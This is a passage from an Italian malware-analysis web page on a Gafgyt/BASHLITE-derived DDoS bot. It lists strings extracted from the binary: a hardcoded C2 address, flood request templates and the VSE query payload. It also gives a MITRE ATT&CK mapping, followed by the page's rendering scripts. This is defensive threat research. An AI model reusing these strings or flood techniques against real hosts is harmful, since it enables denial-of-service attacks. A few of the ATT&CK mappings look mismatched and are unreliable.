+;l'implementazione presenta diversi segnali di codice scritto senza attenzione alla robustezza: assenza di controllo sul valore di ritorno di malloc(), nessuna gestione di fork() con ritorno -1, strcpy() senza bounds checking in initConnection(), uso di gethostbyname() deprecata in SendSTDHEX, e accesso a variabili globali senza sincronizzazione. Questi pattern, combinati con la struttura generale del bot, gli indirizzi C2 hardcoded e i vettori di attacco disponibili, collocano il campione nella categoria dei bot DDoS derivati da Gafgyt/BASHLITE, diffusi in numerose varianti nel panorama delle minacce IoT/Linux.
+
+;il vettore HTTPSTOMP si distingue dagli altri per operare a livello applicativo senza IP spoofing, puntando specificatamente all'infrastruttura antibot di Cloudflare. Questa specializzazione suggerisce che il bot fosse utilizzato contro target protetti da CDN, dove i vettori di flood a livello di rete vengono assorbiti prima di raggiungere il server sottostante.
+
+;l'implementazione di listFork() condivide con il resto del codice una scarsa attenzione alla robustezza: malloc() non viene verificato in caso di fallimento, fork() con ritorno -1 non viene gestita, e l'accesso all'array globale pids[] avviene senza sincronizzazione. In un contesto multiprocesso con attacchi paralleli su target multipli, una malloc() fallita corrompe silenziosamente lo stato globale senza alcun segnale di errore.
+
+=== ALCUNE STRINGHE ESTRATTE CON RADARE2 ===
+
+@@@
+5.2.65.150:999
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH
+Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (K
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KH
+Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (K
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KH
+Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (K
+8.8.8.8
+/proc/net/route
+\t00000000\t
+(null)
+/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58
+TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms
+%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+%s /cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+@@@
+
+=== MITRE ATT&CK ===
+
+--- Execution ---
+
+T1059 Command and Scripting Interpreter
+;il beacon trasmette la presenza di python, python3, perl tramite getPortz().
+;il C2 puo' sfruttare questi interpreti per eseguire comandi arbitrari sull'host.
+
+T1106 Native API
+;uso diretto di syscall Linux: fork(), socket(), sendto(), kill().
+;nessun layer di astrazione, interazione diretta con il kernel.
+
+--- Persistence ---
+
+T1543 Create or Modify System Process
+;double-fork con setsid() e chdir("/"): il processo si distacca completamente.
+;dal terminale di controllo e sopravvive alla chiusura della sessione originale.
+
+--- Defense Evasion ---
+
+T1027 Obfuscated Files or Information
+;payload "NAMESERVER " conservato XOR-ato con chiave 0xCA in .data.
+;offuscamento statico per rallentare analisi YARA/grep sul binario a riposo.
+
+T1036 Masquerading
+;User-Agent HTTP scelto casualmente da un array di 36 stringhe hardcoded.
+;obiettivo: eludere filtri basati su User-Agent fisso.
+
+T1070.006 Indicator Removal: Timestomp
+;seed PRNG basato su getpid() ^ time(0): entropia minima, ma ostacola.
+;la correlazione temporale tra istanze diverse dello stesso bot.
+
+--- Discovery ---
+
+T1082 System Information Discovery
+;getArch() rileva l'architettura CPU e la trasmette al C2 nel beacon.
+
+T1016 System Network Configuration Discovery
+;getOurIP() legge /proc/net/route per identificare l'interfaccia di default.
+;ioctl(SIOCGIFHWADDR) recupera il MAC address.
+
+T1057 Process Discovery
+;getpid() usato per differenziare istanze concorrenti nel seed PRNG.
+
+--- Lateral Movement ---
+
+T1021.004 Remote Services: SSH
+;getPortz() verifica la presenza di telnetd e trasmette il risultato al C2.
+;presenza di telnetd segnala segmento IoT con credenziali di default sfruttabili.
+
+--- Command and Control ---
+
+T1071.001 Application Layer Protocol: Web Protocols
+;vettore HTTPSTOMP opera su HTTP verso endpoint Cloudflare.
+;connessioni TCP reali, traffico indistinguibile da traffico legittimo a livello 3.
+
+T1095 Non-Application Layer Protocol
+;vettori TCP, UDP, VSE operano direttamente a livello di trasporto.
+;raw socket con IP_HDRINCL: pacchetti costruiti manualmente in userspace.
+
+T1571 Non-Standard Port
+;connessione al C2 su porta 999, non standard per traffico di controllo.
+
+T1008 Fallback Channels
+;array commServer[] con meccanismo di failover: se un C2 non risponde.
+;currentServer viene incrementato e si tenta il server successivo.
+
+--- Impact ---
+
+T1498.001 Network Denial of Service: Direct Network Flood
+;vettori TCP, UDP, VSE, STDHEX: flood diretto con IP spoofing.
+;IP sorgente randomizzati nella subnet CIDR per rendere difficile il filtraggio.
+
+T1498.002 Network Denial of Service: Reflection Amplification
+;vettore VSE: le query A2S_INFO verso server Valve possono essere usate.
+;per amplificazione, i server rispondono con payload maggiore della query.
+
+T1499.003 Endpoint Denial of Service: Application Exhaustion Flood
+;vettore HTTPSTOMP: flood a livello applicativo contro endpoint Cloudflare.
+;pattern apri/invia/chiudi senza keep-alive massimizza l'overhead TCP sul target.
+
+<a href="https://spaghetti-hacker.github.io/">index.html</a>
+</script>
+<script>
+(function(){
+    const raw = document.getElementById('content').textContent;
+    const lines = raw.split('\n');
+    const output = document.getElementById('output');
+
+    let i = 0;
+
+    // salta righe vuote iniziali
+    while(i < lines.length && lines[i].trim() === '') i++;
+
+    // prima riga non vuota = titolo
+    const title = lines[i] ? lines[i].trim() : '';
+    if(title){
+        document.title = title;
+    }
+    i++;
+
+    // costruisce il contenuto dentro un unico div.article
+    // il titolo è il nodo di testo iniziale del box
+    let inner = escCode(title);
+    i; // già avanzato
+
+    while(i < lines.length){
+        const line = lines[i];
+
+        // blocco @@@ → codice pre-wrap
+        if(line.trim() === '@@@'){
+            i++;
+            let block = '';
+            while(i < lines.length && lines[i].trim() !== '@@@'){
+                block += lines[i] + '\n';
+                i++;
+            }
+            i++; // salta @@@ di chiusura
+            // il codice viene escapato tranne &lt; &gt; &amp; già scritti
+            //inner += escCode(block.replace(/\n$/, ''));
+	    inner += '<pre class="codeblock">' + escCode(block.replace(/\n$/, '')) + '</pre>';
+            continue;
+        }
+
+        // raccoglie testo fino al prossimo @@@
+        let textLines = [];
+        while(i < lines.length && lines[i].trim() !== '@@@'){
+            textLines.push(lines[i]);
+            i++;
+        }
+
+        const paragraphs = splitParagraphs(textLines);
+        if(paragraphs.length > 0){
+	    inner += '<div class="commento">\n';
+            for (const p of paragraphs){
+                const cleaned = p.replace(/\n/g, '<br>');
+                inner += '<p>' + cleaned + '</p>\n';
+                }
+            inner += '</div>';
+        }
+    }
+
+    output.innerHTML = '<div class="article">' + inner + '</div>';
+
+    // escapa solo il testo codice (non i commenti che possono avere HTML)
+    function escCode(str){
+        return str
+            .replace(/&(?!(?:amp|lt|gt|quot|#\d+);)/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+    }
+
+    function splitParagraphs(lines){
+        const result = [];
+        let current = [];
+        for(const line of lines){
+            if(line.trim() === ''){
+                if(current.length > 0){
+                    result.push(current.join('\n'));
+                    current = [];
+                }
+            } else {
+                current.push(line);
+            }
+        }
+        if(current.length > 0) result.push(current.join('\n'));
+        return result;
+    }
+})();
+</script>
+<script>
+fetch("https://api.counterapi.dev/v1/:spaghettihacker/:gafgyt/up")
+  .then(res => res.json())
+  .then(data => {
+    const counter = data.count;
+
+    document.getElementById("visits").innerText =
+      counter !== undefined ? counter : "error";
+  })
+  .catch(() => {
+    document.getElementById("visits").innerText = "error";
+  });
+</script>
+</body>
+</html>
